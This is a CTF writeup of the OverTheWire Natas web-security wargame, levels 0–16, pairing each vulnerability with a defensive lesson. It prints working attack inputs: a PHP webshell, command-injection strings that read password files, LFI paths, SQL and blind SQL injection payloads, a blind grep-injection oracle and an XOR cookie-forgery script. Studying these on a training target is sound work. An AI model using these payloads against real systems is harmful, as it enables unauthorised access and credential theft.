# OverTheWire: Natas — Writeup (Levels 0–16)


## About This Wargame

Natas teaches server-side web security fundamentals. Unlike Bandit and Leviathan, there is no SSH — every level is a website. You find the next password by exploiting the current level's web vulnerability.

Topics covered include: HTML source inspection, HTTP headers, cookies, PHP source code analysis, path traversal, command injection, SQL injection, and XOR encryption.

---

## Connecting

Each level is accessible at:
``` bash
http://natasX.natas.labs.overthewire.org
```
Username: `natasX` — Password: found in the previous level.

---

## Level 0 → 1: HTML Source Inspection

**Vulnerability:** Password hidden in HTML comment.

```
Ctrl+U → view page source → find HTML comment
```

---

## Level 1 → 2: Bypassing Right-Click Block

**Vulnerability:** Same as Level 0 — password in HTML comment — but right-click is disabled via JavaScript.

```
Ctrl+U → view page source (keyboard shortcut bypasses the JS block)
```

JavaScript-based controls only affect the browser UI layer. The underlying HTTP response is unchanged — the source is always accessible via keyboard shortcuts or browser devtools regardless of JS restrictions.

---

## Level 2 → 3: Directory Listing

**Vulnerability:** An image tag reveals an accessible directory containing a password file.

```bash
Ctrl+U → notice <img src="files/pixel.png">
Navigate to /files → directory listing exposed → open users.txt
```

The web server had directory listing enabled on `/files/`, exposing its contents to anyone who navigated there directly. The `users.txt` file contained the next password.
Directory listing should always be disabled in production. Any exposed file path is a potential pivot point.

---

## Level 3 → 4: robots.txt & Hidden Paths

**Vulnerability:** `robots.txt` reveals a secret directory.

```bash
Ctrl+U → HTML comment hints at search engine indexing
Navigate to /robots.txt →
    Disallow: /s3cr3t/
Navigate to /s3cr3t/ → users.txt contains the password
```

`robots.txt` tells search engine crawlers which paths not to index — but it's a public file, readable by anyone. Attackers routinely check it to discover hidden paths the developer didn't want indexed.

---

## Level 4 → 5: HTTP Referer Header Manipulation

**Vulnerability:** Access control based on the `Referer` HTTP header.

The page checked whether the request came from `natas5.natas.labs.overthewire.org`. Since HTTP headers are client-controlled, we simply forge the `Referer`:

```bash
curl -H "Referer: http://natas5.natas.labs.overthewire.org/" \
     -u natas4:<password> \
     http://natas4.natas.labs.overthewire.org
```

---

## Level 5 → 6: Cookie Manipulation

**Vulnerability:** Authentication state stored in a client-side cookie with no integrity protection.

Inspecting cookies revealed:
```bash
loggedin=0
```

Changing the value to `1` via browser devtools granted access immediately. Cookies must be signed or validated server-side — a raw value the client can edit is not a security control.

---

## Level 6 → 7: PHP Source Disclosure — Secret Include

**Vulnerability:** PHP source code reveals an included file path containing a secret.

Viewing the source showed:
```php
include "includes/secret.inc";
if(array_key_exists("submit", $_POST)) {
    if($secret == $_POST['secret']) { ... }
}
```

Navigating directly to `/includes/secret.inc` returned the PHP file contents:
```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Submitting this value granted access.

---

## Level 7 → 8: Path Traversal (LFI)

**Vulnerability:** Local File Inclusion — user-controlled `page` parameter passed directly to a file include.

The page hint in source:
```html
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

The URL pattern `?page=about` suggested the parameter was used to load files. Replacing it with an absolute path:

```bash
?page=/etc/natas_webpass/natas8
```

The server read and returned the password file directly.
User input must never be passed directly to file-loading functions. Always validate against a whitelist of allowed values.

---

## Level 8 → 9: Reverse Engineering an Encoding Function

**Vulnerability:** Password encoded with a reversible function — working backwards reveals the original input.

The PHP encoding function:
```php
function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
```

Reversing each step in order (hex decode → reverse → base64 decode):

```bash
echo 3d3d516343746d4d6d6c315669563362 | xxd -r -p | rev | base64 -d
```

---

## Level 9 → 10: Command Injection

**Vulnerability:** User input passed unsanitised to a shell command via `passthru()`.

The PHP source:
```php
passthru("grep -i $key dictionary.txt");
```

Injecting shell metacharacters breaks out of the intended command:

```bash
victory dictionary.txt && cat /etc/natas_webpass/natas10 && file
```

This executes three commands: the original `grep`, then `cat` of the password file, then `file` to terminate cleanly.

Never pass user input directly to shell execution functions (`system()`, `exec()`, `passthru()`).

---

## Level 10 → 11: grep Multi-File Injection

**Vulnerability:** Same command injection context, but with some character filtering. `grep` accepts multiple file arguments natively.

```
1 /etc/natas_webpass/natas11
```

`grep` interprets this as: search for `1` in both `dictionary.txt` (implied) and `/etc/natas_webpass/natas11`. Since the password contains a `1`, it matches and prints.

---

## Level 11 → 12: XOR Cookie Forgery

**Vulnerability:** Cookie encrypted with XOR using a short repeating key — recoverable because we know the plaintext.

XOR has a useful property:
```bash
key ^ plaintext = ciphertext
plaintext ^ ciphertext = key
```

Since we knew the default cookie value (`{"showpassword":"no","bgcolor":"#ffffff"}`) and could observe the encoded cookie, we recovered the key, then re-encrypted a modified payload:

```python
import base64

plaintext = b'{"showpassword":"no","bgcolor":"#ffffff"}'
cookie = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg="

ciphertext = base64.b64decode(cookie)
key_stream = bytes(p ^ c for p, c in zip(plaintext, ciphertext))

inject_text = b'{"showpassword":"yes","bgcolor":"#ffffff"}'
key = key_stream[:4]
forged = bytes(b ^ key[i % len(key)] for i, b in enumerate(inject_text))
print(base64.b64encode(forged).decode())
```

Replacing the cookie with the forged value revealed the password. XOR with a short repeating key is not secure encryption. Known-plaintext attacks trivially recover the key.

---

## Level 12 → 13: File Upload — Extension Bypass (RCE)

**Vulnerability:** File upload that trusts a client-supplied filename extension — allows uploading a PHP webshell.

The server used a hidden form field to set the saved filename. By editing this field in browser devtools to change `.jpg` to `.php` before uploading, a PHP file was saved and executed by the server:

```bash
echo '<?php system($_GET["cmd"]); ?>' > test.php
```

Upload `test.php` with the extension changed to `.php`, then:
```
/upload/<filename>.php?cmd=cat /etc/natas_webpass/natas13
```

File upload validation must happen server-side. Never trust a client-supplied filename or extension. Validate file type by content (magic bytes), not by name.

---

## Level 13 → 14: File Upload — Magic Bytes Bypass (RCE)

**Vulnerability:** Server now checks file magic bytes (file signature) — bypass by prepending a valid JPEG header to the PHP payload.

```bash
echo '<?php system($_GET["cmd"]); ?>' > test.php
```
Open in a hex editor and prepend the JPEG magic bytes: `FF D8 FF E0`.  
Upload `test.php` in browser devtools to change `.jpg` to `.php` before uploading, then:
```
/upload/<filename>.php?cmd=cat /etc/natas_webpass/natas14
```

Uploaded files should never be stored in a web-accessible directory or executed by the server.

---

## Level 14 → 15: SQL Injection

**Vulnerability:** Login form vulnerable to classic SQL injection — no input sanitisation.

```sql
" OR 1=1  #
```

This closes the string, adds a condition that always evaluates to true, and comments out the rest of the query — bypassing the password check entirely.

---

## Level 15 → 16: Blind SQL Injection

**Vulnerability:** SQL injection with no output — only a true/false response. Password extracted character by character.

Since the server returned different responses for valid/invalid usernames but never showed data, we used a binary search approach — testing one character at a time using `LIKE` with a wildcard:

```python
payload = {'username': f'natas16" AND BINARY password LIKE \'{password}{ch}%\' #'}
```

See the full script: [`blind_sqli.py`](./blind_sqli.py)  
The absence of visible output does not mean injection is unexploitable — boolean-based and time-based techniques can still extract the full database.

---

## Level 16 → 17: Blind Command Injection via grep

**Vulnerability:** Filtered command injection inside a `grep` call — exploited using command substitution to leak data character by character.

Similar in concept to blind SQL injection but using shell behaviour. If the injected grep returned results, the outer grep found nothing matches in the dictionary; if not, it returned 'victory' (in my coomand below) — giving us a true/false oracle:

```python
payload = {'needle': f"$(grep ^{password}{ch} /etc/natas_webpass/natas17)victory",
           "submit": "Search"}
```

See the full script: [`blind_grep.py`](./blind_grep.py).  
Blind injection techniques apply beyond SQL — any place where user input influences a binary true/false outcome can potentially be used to leak data one bit at a time.

---


## Key Concepts Covered

| Topic | Levels |
|---|---|
| HTML source & comment inspection | 0, 1 |
| Directory listing exposure | 2 |
| robots.txt enumeration | 3 |
| HTTP header forgery | 4 |
| Cookie manipulation | 5 |
| PHP source disclosure | 6 |
| Local File Inclusion (LFI) | 7 |
| Reverse engineering encoding | 8 |
| Command injection | 9, 10 |
| XOR known-plaintext attack | 11 |
| File upload — extension bypass (RCE) | 12 |
| File upload — magic bytes bypass (RCE) | 13 |
| SQL injection | 14 |
| Blind SQL injection | 15 |
| Blind command injection | 16 |


---

*Part of my CTF learning journey. See the [main repo](../../README.md) for other writeups.*
